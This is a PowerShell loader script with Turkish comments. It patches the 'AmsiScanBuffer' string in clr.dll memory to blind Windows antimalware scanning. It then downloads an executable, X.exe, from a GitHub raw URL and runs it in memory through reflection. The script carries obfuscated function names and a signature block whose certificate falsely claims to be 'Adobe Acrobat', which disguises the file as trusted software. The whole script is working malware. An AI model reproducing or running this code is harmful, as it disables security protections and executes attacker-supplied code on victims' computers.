$page_readonly = 0x02
$page_readwrite = 0x04
$page_execute_readwrite = 0x40
$page_execute_read = 0x20
$page_guard = 0x100
$mem_commit = 0x1000
$max_path = 260

function bvKLeYNXgYcHSSrooWILHwsaWAbquHNAMktFwELJEGYrGTCXsrSIgWffzwHqiFFmaDNMZDKabej {
    param ($protect, $state)
    return ((($protect -band $page_readonly) -eq $page_readonly -or
             ($protect -band $page_readwrite) -eq $page_readwrite -or
             ($protect -band $page_execute_readwrite) -eq $page_execute_readwrite -or
             ($protect -band $page_execute_read) -eq $page_execute_read) -and
            ($protect -band $page_guard) -ne $page_guard -and
            ($state -band $mem_commit) -eq $mem_commit)
}

function bYRqQeDrgusgKPfSrCBmeZddeJApLyYaulMcIneGrWvWWVdvkMbYnixgYyLXYEfOmUOvDUuFBSs {
    param ($buffer, $pattern, $index)
    for ($i = 0; $i -lt $pattern.Length; $i++) {
        if ($buffer[$index + $i] -ne $pattern[$i]) {
            return $false
        }
    }
    return $true
}

try {
    if ($psversiontable.PSVersion.Major -gt 2) {
        # Dinamik tipler ve PInvoke metodları tanımlanıyor (Win32 API için)
        $dynassembly = New-Object System.Reflection.AssemblyName("Win32")
        $assemblybuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($dynassembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $modulebuilder = $assemblybuilder.DefineDynamicModule("Win32", $false)

        $typebuilder = $modulebuilder.DefineType("Win32.MEMORY_INFO_BASIC", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
        [void]$typebuilder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
        $memory_info_basic_struct = $typebuilder.CreateType()

        $typebuilder = $modulebuilder.DefineType("Win32.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
        [void]$typebuilder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$typebuilder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
        $system_info_struct = $typebuilder.CreateType()

        $typebuilder = $modulebuilder.DefineType("Win32.Kernel32", "Public, Class")
        $dllimportconstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $setlasterror = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
        $setlasterrorcustomattribute = New-Object Reflection.Emit.CustomAttributeBuilder($dllimportconstructor, "kernel32.dll", [Reflection.FieldInfo[]]@($setlasterror), @($true))

        # PInvoke methodları tanımla
        $pinvokemethod = $typebuilder.DefinePInvokeMethod("VirtualProtect", "kernel32.dll",
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard, [bool],
            [Type[]]@([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
        $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)

        $pinvokemethod = $typebuilder.DefinePInvokeMethod("GetCurrentProcess", "kernel32.dll",
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@(),
            [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
        $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)

        $pinvokemethod = $typebuilder.DefinePInvokeMethod("VirtualQuery", "kernel32.dll",
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard, [IntPtr],
            [Type[]]@([IntPtr], [Win32.MEMORY_INFO_BASIC].MakeByRefType(), [uint32]),
            [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
        $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)

        $pinvokemethod = $typebuilder.DefinePInvokeMethod("GetSystemInfo", "kernel32.dll",
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard, [void],
            [Type[]]@([Win32.SYSTEM_INFO].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
        $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)

        $pinvokemethod = $typebuilder.DefinePInvokeMethod("GetMappedFileName", "psapi.dll",
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard, [Int32],
            [Type[]]@([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32]),
            [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
        $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)

        $pinvokemethod = $typebuilder.DefinePInvokeMethod("ReadProcessMemory", "kernel32.dll",
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard, [Int32],
            [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
        $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)

        $pinvokemethod = $typebuilder.DefinePInvokeMethod("WriteProcessMemory", "kernel32.dll",
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard, [Int32],
            [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
        $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)

        $kernel32 = $typebuilder.CreateType()

        # Bellekte aranan imza
        $signature = [System.Text.Encoding]::UTF8.GetBytes('AmsiScanBuffer')

        $hprocess = [Win32.Kernel32]::GetCurrentProcess()
        $sysinfo = New-Object Win32.SYSTEM_INFO
        [void][Win32.Kernel32]::GetSystemInfo([ref]$sysinfo)
        $memoryregions = @()
        $address = [IntPtr]::Zero
        while ($address.ToInt64() -lt $sysinfo.lpMaximumApplicationAddress.ToInt64()) {
            $meminfo = New-Object Win32.MEMORY_INFO_BASIC
            if ([Win32.Kernel32]::VirtualQuery($address, [ref]$meminfo, [System.Runtime.InteropServices.Marshal]::SizeOf($meminfo))) {
                $memoryregions += $meminfo
            }
            $address = New-Object IntPtr($meminfo.BaseAddress.ToInt64() + $meminfo.RegionSize.ToInt64())
        }

        foreach ($region in $memoryregions) {
            if (-not (bvKLeYNXgYcHSSrooWILHwsaWAbquHNAMktFwELJEGYrGTCXsrSIgWffzwHqiFFmaDNMZDKabej $region.Protect $region.State)) {
                continue
            }
            $pathbuilder = New-Object System.Text.StringBuilder $max_path
            if ([Win32.Kernel32]::GetMappedFileName($hprocess, $region.BaseAddress, $pathbuilder, $max_path) -gt 0) {
                $path = $pathbuilder.ToString()
                if ($path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
                    $buffer = New-Object byte[] $region.RegionSize.ToInt64()
                    $bytesread = 0
                    [void][Win32.Kernel32]::ReadProcessMemory($hprocess, $region.BaseAddress, $buffer, $buffer.Length, [ref]$bytesread)
                    for ($k = 0; $k -lt ($bytesread - $signature.Length); $k++) {
                        $found = $true
                        for ($m = 0; $m -lt $signature.Length; $m++) {
                            if ($buffer[$k + $m] -ne $signature[$m]) {
                                $found = $false
                                break
                            }
                        }
                        if ($found) {
                            $oldprotect = 0
                            if (($region.Protect -band $page_readwrite) -ne $page_readwrite) {
                                [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $page_execute_readwrite, [ref]$oldprotect)
                            }
                            $replacement = New-Object byte[] $signature.Length
                            $byteswritten = 0
                            [void][Win32.Kernel32]::WriteProcessMemory($hprocess, [IntPtr]::Add($region.BaseAddress, $k), $replacement, $replacement.Length, [ref]$byteswritten)
                            if (($region.Protect -band $page_readwrite) -ne $page_readwrite) {
                                [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $region.Protect, [ref]$oldprotect)
                            }
                        }
                    }
                }
            }
        }
    }

    # Dosya indirme ve assembly çalıştırma
    $url = 'https://github.com/babaproqrqqw/dada/raw/refs/heads/main/X.exe'
    Add-Type -AssemblyName System.Net.Http
    $httpclient = [System.Net.Http.HttpClient]::new()

    $task = $httpclient.GetByteArrayAsync($url)
    $task.Wait()
    $bytes = $task.Result

    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)
    $entrypoint = $assembly.EntryPoint

    if ($null -ne $entrypoint) {
        $params = $entrypoint.GetParameters()
        if ($params.Count -eq 0) {
            $entrypoint.Invoke($null, $null)
        } else {
            $args = New-Object Object[] $params.Count
            for ($i = 0; $i -lt $params.Count; $i++) {
                if ($params[$i].ParameterType -eq [string[]]) {
                    $args[$i] = [string[]]@()
                } else {
                    $args[$i] = $null
                }
            }
            $entrypoint.Invoke($null, $args)
        }
    } else {
        Write-Warning "Entry point bulunamadı!"
    }
}
catch {
    Write-Host "Hata: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "İşlem tamamlandı. Kapatmak için bir tuşa basın..."
$x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# SIG # Begin signature block
# MIIbyAYJKoZIhvcNAQcCoIIbuTCCG7UCAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAaKdEVDAliX+3i
# 1+QQjY+70MQfxiZzDGdKVhbDLE9r5KCCFj0wggL/MIIB66ADAgECAhAEdRfJHVwV
# oEyJlgOloD5AMAkGBSsOAwIdBQAwGDEWMBQGA1UEAxMNQWRvYmUgQWNyb2JhdDAe
# Fw0yNDEyMzEyMTAwMDBaFw0yNjEyMzAyMTAwMDBaMBgxFjAUBgNVBAMTDUFkb2Jl
# IEFjcm9iYXQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCv9/KnFfE6
# 6bWya7jQtqsE/GlSt7cFaAgbgDr3id6RjAqskcZzOchXsxXANge1CHc9mw83i89N
# y2/FkpurmdL4I5davAAqJWp6cbq+8cuPIYgRZmsAxnb8H+t+z/zTaqt+oF3VSzzj
# A5SKY4vsebDntObPaaohgoH09MOHz4PjdwDkGps9DWDZoaw1uHrUEbFRvzMt1RHv
# L+LNuj8kmfRL5o1gbwz0hRVPXwso8eiYlNgGdSE6r2EhtDbC4N59rFq8tgoTvazi
# 2oCv1h2itnO8MW5Iu0JxBcI0wvlJ5ft2oYxKG/ifCJ5yY/uSSy0yfxBLX2XpSk3E
# VLpCgiMAYqEFAgMBAAGjTTBLMEkGA1UdAQRCMECAEHnncz55vuoJ4MD/3upeekWh
# GjAYMRYwFAYDVQQDEw1BZG9iZSBBY3JvYmF0ghAEdRfJHVwVoEyJlgOloD5AMAkG
# BSsOAwIdBQADggEBAHp9P95KdOu1H7xUVeSmxHKYl8tDIIbz24kas7Y4S5mPwjrB
# rOBPtCgzynomRWp1zok2qhRPMwgJ2J/pGtR+WOBr9OnqVemGp3gk689Lp8Lio1Pa
# 5k6qx4BxSUwzTegRrZkUCQF3J6bHmdwIJflBGoORyCXcl1NGjF/XPzts1P2nxhD+
# 9FdqgDyg1SHCwPTf3vWtRP40j9ZHZ4oV41hmdbEX98Zf28lhGrpQ3yWe9xaLB5QH
# o4zQmESf8edtppMonGuGQIk2VzH2FZUQRCAI32GDfFTKgoJ81yQoua2exO7New1l
# r57g3vYgRDhS8q9djHnZD/zyqgCsU26KtQUVfKswggWNMIIEdaADAgECAhAOmxiO
# +dAt5+/bUOIIQBhaMA0GCSqGSIb3DQEBDAUAMGUxCzAJBgNVBAYTAlVTMRUwEwYD
# VQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAi
# BgNVBAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0yMjA4MDEwMDAw
# MDBaFw0zMTExMDkyMzU5NTlaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdp
# Q2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERp
# Z2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCC
# AgoCggIBAL/mkHNo3rvkXUo8MCIwaTPswqclLskhPfKK2FnC4SmnPVirdprNrnsb
# hA3EMB/zG6Q4FutWxpdtHauyefLKEdLkX9YFPFIPUh/GnhWlfr6fqVcWWVVyr2iT
# cMKyunWZanMylNEQRBAu34LzB4TmdDttceItDBvuINXJIB1jKS3O7F5OyJP4IWGb
# NOsFxl7sWxq868nPzaw0QF+xembud8hIqGZXV59UWI4MK7dPpzDZVu7Ke13jrclP
# XuU15zHL2pNe3I6PgNq2kZhAkHnDeMe2scS1ahg4AxCN2NQ3pC4FfYj1gj4QkXCr
# VYJBMtfbBHMqbpEBfCFM1LyuGwN1XXhm2ToxRJozQL8I11pJpMLmqaBn3aQnvKFP
# ObURWBf3JFxGj2T3wWmIdph2PVldQnaHiZdpekjw4KISG2aadMreSx7nDmOu5tTv
# kpI6nj3cAORFJYm2mkQZK37AlLTSYW3rM9nF30sEAMx9HJXDj/chsrIRt7t/8tWM
# cCxBYKqxYxhElRp2Yn72gLD76GSmM9GJB+G9t+ZDpBi4pncB4Q+UDCEdslQpJYls
# 5Q5SUUd0viastkF13nqsX40/ybzTQRESW+UQUOsxxcpyFiIJ33xMdT9j7CFfxCBR
# a2+xq4aLT8LWRV+dIPyhHsXAj6KxfgommfXkaS+YHS312amyHeUbAgMBAAGjggE6
# MIIBNjAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTs1+OC0nFdZEzfLmc/57qY
# rhwPTzAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYunpyGd823IDzAOBgNVHQ8BAf8E
# BAMCAYYweQYIKwYBBQUHAQEEbTBrMCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5k
# aWdpY2VydC5jb20wQwYIKwYBBQUHMAKGN2h0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0
# LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RDQS5jcnQwRQYDVR0fBD4wPDA6oDig
# NoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9v
# dENBLmNybDARBgNVHSAECjAIMAYGBFUdIAAwDQYJKoZIhvcNAQEMBQADggEBAHCg
# v0NcVec4X6CjdBs9thbX979XB72arKGHLOyFXqkauyL4hxppVCLtpIh3bb0aFPQT
# SnovLbc47/T/gLn4offyct4kvFIDyE7QKt76LVbP+fT3rDB6mouyXtTP0UNEm0Mh
# 65ZyoUi0mcudT6cGAxN3J0TU53/oWajwvy8LpunyNDzs9wPHh6jSTEAZNUZqaVSw
# uKFWjuyk1T3osdz9HNj0d1pcVIxv76FQPfx2CWiEn2/K2yCNNWAcAgPLILCsWKAO
# QGPFmCLBsln1VWvPJ6tsds5vIy30fnFqI2si/xK4VC0nftg62fC2h5b9W9FcrBjD
# TZ9ztwGpn1eqXijiuZQwgga0MIIEnKADAgECAhANx6xXBf8hmS5AQyIMOkmGMA0G
# CSqGSIb3DQEBCwUAMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ
# bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0
# IFRydXN0ZWQgUm9vdCBHNDAeFw0yNTA1MDcwMDAwMDBaFw0zODAxMTQyMzU5NTla
# MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5EaWdpQ2VydCwgSW5jLjFBMD8GA1UE
# AxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBUaW1lU3RhbXBpbmcgUlNBNDA5NiBTSEEy
# NTYgMjAyNSBDQTEwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC0eDHT
# CphBcr48RsAcrHXbo0ZodLRRF51NrY0NlLWZloMsVO1DahGPNRcybEKq+RuwOnPh
# of6pvF4uGjwjqNjfEvUi6wuim5bap+0lgloM2zX4kftn5B1IpYzTqpyFQ/4Bt0mA
# xAHeHYNnQxqXmRinvuNgxVBdJkf77S2uPoCj7GH8BLuxBG5AvftBdsOECS1UkxBv
# MgEdgkFiDNYiOTx4OtiFcMSkqTtF2hfQz3zQSku2Ws3IfDReb6e3mmdglTcaarps
# 0wjUjsZvkgFkriK9tUKJm/s80FiocSk1VYLZlDwFt+cVFBURJg6zMUjZa/zbCclF
# 83bRVFLeGkuAhHiGPMvSGmhgaTzVyhYn4p0+8y9oHRaQT/aofEnS5xLrfxnGpTXi
# UOeSLsJygoLPp66bkDX1ZlAeSpQl92QOMeRxykvq6gbylsXQskBBBnGy3tW/AMOM
# CZIVNSaz7BX8VtYGqLt9MmeOreGPRdtBx3yGOP+rx3rKWDEJlIqLXvJWnY0v5ydP
# pOjL6s36czwzsucuoKs7Yk/ehb//Wx+5kMqIMRvUBDx6z1ev+7psNOdgJMoiwOrU
# G2ZdSoQbU2rMkpLiQ6bGRinZbI4OLu9BMIFm1UUl9VnePs6BaaeEWvjJSjNm2qA+
# sdFUeEY0qVjPKOWug/G6X5uAiynM7Bu2ayBjUwIDAQABo4IBXTCCAVkwEgYDVR0T
# AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQU729TSunkBnx6yuKQVvYv1Ensy04wHwYD
# VR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4cD08wDgYDVR0PAQH/BAQDAgGGMBMG
# A1UdJQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUFBwEBBGswaTAkBggrBgEFBQcwAYYY
# aHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEGCCsGAQUFBzAChjVodHRwOi8vY2Fj
# ZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNydDBDBgNV
# HR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
# cnVzdGVkUm9vdEc0LmNybDAgBgNVHSAEGTAXMAgGBmeBDAEEAjALBglghkgBhv1s
# BwEwDQYJKoZIhvcNAQELBQADggIBABfO+xaAHP4HPRF2cTC9vgvItTSmf83Qh8WI
# GjB/T8ObXAZz8OjuhUxjaaFdleMM0lBryPTQM2qEJPe36zwbSI/mS83afsl3YTj+
# IQhQE7jU/kXjjytJgnn0hvrV6hqWGd3rLAUt6vJy9lMDPjTLxLgXf9r5nWMQwr8M
# yb9rEVKChHyfpzee5kH0F8HABBgr0UdqirZ7bowe9Vj2AIMD8liyrukZ2iA/wdG2
# th9y1IsA0QF8dTXqvcnTmpfeQh35k5zOCPmSNq1UH410ANVko43+Cdmu4y81hjaj
# V/gxdEkMx1NKU4uHQcKfZxAvBAKqMVuqte69M9J6A47OvgRaPs+2ykgcGV00TYr2
# Lr3ty9qIijanrUR3anzEwlvzZiiyfTPjLbnFRsjsYg39OlV8cipDoq7+qNNjqFze
# GxcytL5TTLL4ZaoBdqbhOhZ3ZRDUphPvSRmMThi0vw9vODRzW6AxnJll38F0cuJG
# 7uEBYTptMSbhdhGQDpOXgpIUsWTjd6xpR6oaQf/DJbg3s6KCLPAlZ66RzIg9sC+N
# Jpud/v4+7RWsWCiKi9EOLLHfMR2ZyJ/+xhCx9yHbxtl5TPau1j/1MIDpMPx0LckT
# etiSuEtQvLsNz3Qbp7wGWqbIiOWCnb5WqxL3/BAPvIXKUjPSxyZsq8WhbaM2tszW
# kPZPubdcMIIG7TCCBNWgAwIBAgIQCoDvGEuN8QWC0cR2p5V0aDANBgkqhkiG9w0B
# AQsFADBpMQswCQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQsIEluYy4xQTA/
# BgNVBAMTOERpZ2lDZXJ0IFRydXN0ZWQgRzQgVGltZVN0YW1waW5nIFJTQTQwOTYg
# U0hBMjU2IDIwMjUgQ0ExMB4XDTI1MDYwNDAwMDAwMFoXDTM2MDkwMzIzNTk1OVow
# YzELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMTswOQYDVQQD
# EzJEaWdpQ2VydCBTSEEyNTYgUlNBNDA5NiBUaW1lc3RhbXAgUmVzcG9uZGVyIDIw
# MjUgMTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBANBGrC0Sxp7Q6q5g
# VrMrV7pvUf+GcAoB38o3zBlCMGMyqJnfFNZx+wvA69HFTBdwbHwBSOeLpvPnZ8ZN
# +vo8dE2/pPvOx/Vj8TchTySA2R4QKpVD7dvNZh6wW2R6kSu9RJt/4QhguSssp3qo
# me7MrxVyfQO9sMx6ZAWjFDYOzDi8SOhPUWlLnh00Cll8pjrUcCV3K3E0zz09ldQ/
# /nBZZREr4h/GI6Dxb2UoyrN0ijtUDVHRXdmncOOMA3CoB/iUSROUINDT98oksouT
# MYFOnHoRh6+86Ltc5zjPKHW5KqCvpSduSwhwUmotuQhcg9tw2YD3w6ySSSu+3qU8
# DD+nigNJFmt6LAHvH3KSuNLoZLc1Hf2JNMVL4Q1OpbybpMe46YceNA0LfNsnqcnp
# JeItK/DhKbPxTTuGoX7wJNdoRORVbPR1VVnDuSeHVZlc4seAO+6d2sC26/PQPdP5
# 1ho1zBp+xUIZkpSFA8vWdoUoHLWnqWU3dCCyFG1roSrgHjSHlq8xymLnjCbSLZ49
# kPmk8iyyizNDIXj//cOgrY7rlRyTlaCCfw7aSUROwnu7zER6EaJ+AliL7ojTdS5P
# WPsWeupWs7NpChUk555K096V1hE0yZIXe+giAwW00aHzrDchIc2bQhpp0IoKRR7Y
# ufAkprxMiXAJQ1XCmnCfgPf8+3mnAgMBAAGjggGVMIIBkTAMBgNVHRMBAf8EAjAA
# MB0GA1UdDgQWBBTkO/zyMe39/dfzkXFjGVBDz2GM6DAfBgNVHSMEGDAWgBTvb1NK
# 6eQGfHrK4pBW9i/USezLTjAOBgNVHQ8BAf8EBAMCB4AwFgYDVR0lAQH/BAwwCgYI
# KwYBBQUHAwgwgZUGCCsGAQUFBwEBBIGIMIGFMCQGCCsGAQUFBzABhhhodHRwOi8v
# b2NzcC5kaWdpY2VydC5jb20wXQYIKwYBBQUHMAKGUWh0dHA6Ly9jYWNlcnRzLmRp
# Z2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRHNFRpbWVTdGFtcGluZ1JTQTQwOTZT
# SEEyNTYyMDI1Q0ExLmNydDBfBgNVHR8EWDBWMFSgUqBQhk5odHRwOi8vY3JsMy5k
# aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkRzRUaW1lU3RhbXBpbmdSU0E0MDk2
# U0hBMjU2MjAyNUNBMS5jcmwwIAYDVR0gBBkwFzAIBgZngQwBBAIwCwYJYIZIAYb9
# bAcBMA0GCSqGSIb3DQEBCwUAA4ICAQBlKq3xHCcEua5gQezRCESeY0ByIfjk9iJP
# 2zWLpQq1b4URGnwWBdEZD9gBq9fNaNmFj6Eh8/YmRDfxT7C0k8FUFqNh+tshgb4O
# 6Lgjg8K8elC4+oWCqnU/ML9lFfim8/9yJmZSe2F8AQ/UdKFOtj7YMTmqPO9mzskg
# iC3QYIUP2S3HQvHG1FDu+WUqW4daIqToXFE/JQ/EABgfZXLWU0ziTN6R3ygQBHMU
# BaB5bdrPbF6MRYs03h4obEMnxYOX8VBRKe1uNnzQVTeLni2nHkX/QqvXnNb+YkDF
# kxUGtMTaiLR9wjxUxu2hECZpqyU1d0IbX6Wq8/gVutDojBIFeRlqAcuEVT0cKsb+
# zJNEsuEB7O7/cuvTQasnM9AWcIQfVjnzrvwiCZ85EE8LUkqRhoS3Y50OHgaY7T/l
# wd6UArb+BOVAkg2oOvol/DJgddJ35XTxfUlQ+8Hggt8l2Yv7roancJIFcbojBcxl
# RcGG0LIhp6GvReQGgMgYxQbV1S3CrWqZzBt1R9xJgKf47CdxVRd/ndUlQ05oxYy2
# zRWVFjF7mcr4C34Mj3ocCVccAvlKV9jEnstrniLvUxxVZE/rptb7IRE2lskKPIJg
# baP5t2nGj/ULLi49xTcBZU8atufk+EMF/cWuiC7POGT75qaL6vdCvHlshtjdNXOC
# IUjsarfNZzGCBOEwggTdAgEBMCwwGDEWMBQGA1UEAxMNQWRvYmUgQWNyb2JhdAIQ
# BHUXyR1cFaBMiZYDpaA+QDANBglghkgBZQMEAgEFAKBeMBAGCisGAQQBgjcCAQwx
# AjAAMBkGCSqGSIb3DQEJAzEMBgorBgEEAYI3AgEEMC8GCSqGSIb3DQEJBDEiBCBR
# 2HKv5IgxQG9WR8ub6eOJjty3rzq0AxGLbxTRAGsRDzANBgkqhkiG9w0BAQEFAASC
# AQAAmGCs3kRA+3TeHd5HB6+nMDSnkPCXb53Yr8jizEOYx/SfQj8GlvAEPgF9vO0I
# 3r+9fKx81DfnA+YXMQs6C5xgKVkv2Y4MCdIVGih4JwdCIdGYtJKUs8q5F3jrdTwz
# Uhsgxddfi5ESwgMqRYG68B+YAtTdiprzEEceFGGgnEsucd/oRS6b5gfj6qQvKmY5
# Qhxc0Ml85glAlaI9z0YgeDat5xtbhwRUYAYslPe6ypslGCgWr5OV2jJcEl16o2zM
# biwTQ17eHj81b+nTEeuxLtAcFMND1UYOAxcOKy02kp0youJKa7vqen11e2nhF8/s
# A3U9VdimNDB66u/+K/1+veqboYIDJjCCAyIGCSqGSIb3DQEJBjGCAxMwggMPAgEB
# MH0waTELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRpZ2lDZXJ0LCBJbmMuMUEwPwYD
# VQQDEzhEaWdpQ2VydCBUcnVzdGVkIEc0IFRpbWVTdGFtcGluZyBSU0E0MDk2IFNI
# QTI1NiAyMDI1IENBMQIQCoDvGEuN8QWC0cR2p5V0aDANBglghkgBZQMEAgEFAKBp
# MBgGCSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTI1MDgw
# OTA5NTEzNFowLwYJKoZIhvcNAQkEMSIEIGYqs1W6dsT6TnZaJAAeAk5Lluan9uVr
# DUaJQs+A9sPqMA0GCSqGSIb3DQEBAQUABIICALbcgkqurPvIQR2dzq9Yhi2GuJyw
# aJvoSibf/Dr1pccCi4VlkffiKBcjKbVnj5GoO59TDUGUeGDasjD5NPR/yHoCyf2f
# FMEE+PjNiZRyn9YYfxBW1PY5I/ZDqANH4nxKtjCMlPa6r9HAf8yroO7Ubr1g8t7T
# JOPLNg4ffBJyyP+XLeuX5+gC8q3e/BFyLE3a0JPhaw2urFr5FyFedwhyVKALpcmY
# Y18r156pDCORy28yew+KWaVAE5MIaYruhxKSdlDrFsYvi7xNXVct39cPBC9TxxqS
# asQwcT0sLzGJNMP4G0WqB2J28T1hlUr4YPQAvqeU7PyHzgdNBgjGOIT8niHeDQU3
# WEdm5EKMuVPqO/HtWwfrEeg3M0CDWbN4z5s5o3HpCvFElIdMeet15xhyMH1XjW8R
# OpzXsfpjmBce05qXwgl4bh+t4Ng5WHpB844FZPfu7XUu6Y9nyZm8YYptaRYgbs/1
# LvG1o2vk1gnNQkC9HWZBp26eaXhmxYLZf4Lo0Wm3KoWwpG5W1/uCZ/r+p3QRHiwv
# qzuJ17bgDNFKELrol26RyrmrgHIA5gGdz3J2x8Gqy8+OaTaw0cOsqt78yqyaENM8
# 9aROvsyQtiV6Xpu8ZxJj4ix2c7O1+CQdpi/+XvnpbTZ/vbQ4rH3V+XgYmNIstdYv
# 4HNUAadIbLfO5QmF
# SIG # End signature block
